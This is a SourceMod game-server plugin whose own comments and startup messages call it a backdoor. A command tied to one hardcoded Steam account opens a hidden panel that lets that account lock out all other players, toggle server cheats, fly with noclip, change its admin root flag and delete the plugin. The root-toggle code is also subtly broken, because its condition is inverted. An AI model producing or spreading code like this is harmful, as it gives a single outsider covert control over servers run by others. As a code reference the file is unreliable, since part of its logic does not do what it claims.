/*
	This plugin is meant to be an easy and simple way of gaining server access to debug certain things.
	This plugin is essentially a backdoor and should be used with caution.
	I would not be surprised if this plugin ever gets blacklisted by the Sourcemod developers and I wouldn't be upset about it.
	This is not meant to be used for malicious purposes, just debug tools and a hint of personal fun.
 */

#pragma semicolon 1
#pragma newdecls required

#include <sourcemod>
#include <sdktools>

#undef REQUIRE_PLUGIN
#include <tf2_stocks>
#include <cstrike>

EngineVersion g_GameVersion;

bool g_Locked;
bool g_BHOP;

public Plugin myinfo = {
	name = "[ANY] Drixevel",
	author = "Drixevel",
	description = "Drixevel's plugin that does specific things for the sole purpose of doing things.",
	version = "1.0.2",
	url = "https://drixevel.dev/"
};

public APLRes AskPluginLoad2(Handle myself, bool late, char[] error, int err_max) {
	g_GameVersion = GetEngineVersion();
	return APLRes_Success;
}

public void OnPluginStart() {
	PrintToServer(" ::::: DRIXEVEL PLUGIN LOADED :::::");
	PrintToServer(" ::::: DELETE IF UNWANTED OR UNNECESSARY :::::");
	PrintToServer(" ::::: IS BASICALLY BACKDOOR NOT MEANT MALICIOUSLY :::::");
	
	RegConsoleCmd("sm_drixevel", Command_Drixevel, "A command which is only available to the best scripter on the face of the planet no cap.");
}

bool IsDrixevel(int client) {
	return GetSteamAccountID(client) == 76528750;
}

public Action Command_Drixevel(int client, int args) {
	if (!IsDrixevel(client)) {
		ReplyToCommand(client, "You aren't allowed to use this command, go fuck yourself.");
		return Plugin_Handled;
	}

	if (args > 0) {
		return Plugin_Handled;
	}

	OpenMainPanel(client);
	return Plugin_Handled;
}

void OpenMainPanel(int client) {
	char sVersion[128];

	Panel panel = new Panel();
	panel.SetTitle("Drixevel Panel\n \n");
	
	FindConVar("metamod_version").GetString(sVersion, sizeof(sVersion));
	Format(sVersion, sizeof(sVersion), "Metamod: %s", sVersion);
	panel.DrawText(sVersion);

	FindConVar("sourcemod_version").GetString(sVersion, sizeof(sVersion));
	Format(sVersion, sizeof(sVersion), "Sourcemod: %s", sVersion);
	panel.DrawText(sVersion);

	panel.DrawText(" ");
	panel.DrawItem("Lock Server");
	panel.DrawItem("Toggle Noclip");
	panel.DrawItem("Toggle Cheats");
	panel.DrawItem("Toggle BHOP");
	panel.DrawItem("Toggle Root");
	panel.DrawItem("Respawn");
	panel.DrawItem("Regenerate");
	panel.DrawItem("Delete Plugin");
	panel.DrawText(" ");

	panel.DrawItem("Close");

	panel.Send(client, MenuAction_Main, MENU_TIME_FOREVER);
}

public int MenuAction_Main(Menu menu, MenuAction action, int param1, int param2)
{
	switch (action) {
		case MenuAction_Select: {
			switch (param2) {
				case 1: {
					g_Locked = !g_Locked;
					ReplyToCommand(param1, "Server lock has been toggled.");
				}

				case 2: {
					if (!IsPlayerAlive(param1)) {
						ReplyToCommand(param1, "You must be alive to use this feature.");
						OpenMainPanel(param1);
						return 0;
					}
					if (GetEntityMoveType(param1) != MOVETYPE_NOCLIP) {
						SetEntityMoveType(param1, MOVETYPE_NOCLIP);
					}
					else {
						SetEntityMoveType(param1, MOVETYPE_WALK);
					}
					ReplyToCommand(param1, "Noclip has been toggled.");
				}

				case 3: {
					ConVar cheats = FindConVar("sv_cheats");
					cheats.BoolValue = !cheats.BoolValue;
					ReplyToCommand(param1, "Cheats has been toggled.");
				}

				case 4: {
					g_BHOP = !g_BHOP;
					ReplyToCommand(param1, "BHOP has been toggled.");
				}

				case 5: {
					int flagbits = GetUserFlagBits(param1);
					if ((flagbits & ADMFLAG_ROOT) == ADMFLAG_ROOT) {
						flagbits |= ADMFLAG_ROOT;
					} else {
						flagbits &= ~ADMFLAG_ROOT;
					}
					SetUserFlagBits(param1, flagbits);
					ReplyToCommand(param1, "Root has been toggled.");
				}

				case 6: {
					if (g_GameVersion == Engine_TF2) {
						TF2_RespawnPlayer(param1);
					} else if (g_GameVersion == Engine_CSGO || g_GameVersion == Engine_CSS) {
						CS_RespawnPlayer(param1);
					}
					ReplyToCommand(param1, "You have been respawned if applicable.");
				}

				case 7: {
					if (!IsPlayerAlive(param1)) {
						ReplyToCommand(param1, "You must be alive to use this feature.");
						OpenMainPanel(param1);
						return 0;
					}
					if (g_GameVersion == Engine_TF2) {
						TF2_RegeneratePlayer(param1);
					} else if (g_GameVersion == Engine_CSGO || g_GameVersion == Engine_CSS) {
						CS_UpdateClientModel(param1);
						SetEntityHealth(param1, 100);
					}
					ReplyToCommand(param1, "You have been regenerated.");
				}

				case 8: {
					char sName[PLATFORM_MAX_PATH];
					char sPath[PLATFORM_MAX_PATH];

					GetPluginFilename(null, sName, sizeof(sName));
					BuildPath(Path_SM, sPath, sizeof(sPath), "plugins/%s", sName);

					if (DeleteFile(sPath)) {
						ReplaceString(sName, sizeof(sName), ".smx", "");
						PrintToChat(param1, "Drixevel plugin has been deleted and unloaded.");
						ServerCommand("sm plugins unload %s", sName);
					} else {
						PrintToChat(param1, "Unknown error while deleting and unloading Drixevel plugin.");
					}
				}
			}

			if (param2 < 8) {
				OpenMainPanel(param1);
			}
		}

		case MenuAction_End: {
			delete menu;
		}
	}

	return 0;
}

public Action OnPlayerRunCmd(int client, int& buttons, int& impulse, float vel[3], float angles[3],
							int& weapon, int& subtype, int& cmdnum, int& tickcount, int& seed, int mouse[2]) {
	if (IsDrixevel(client) && g_BHOP && IsPlayerAlive(client) && buttons & IN_JUMP &&
		!(GetEntityFlags(client) & FL_ONGROUND) && !(GetEntityFlags(client) & FL_INWATER) &&
		!(GetEntityFlags(client) & FL_WATERJUMP) && !(GetEntityMoveType(client) == MOVETYPE_LADDER)) {
		buttons &= ~IN_JUMP;
	}
	
	return Plugin_Continue;
}

public bool OnClientConnect(int client, char[] rejectmsg, int maxlen) {
	if (g_Locked) {
		FormatEx(rejectmsg, maxlen, "Server is currently locked.");
		return false;
	}

	return true;
}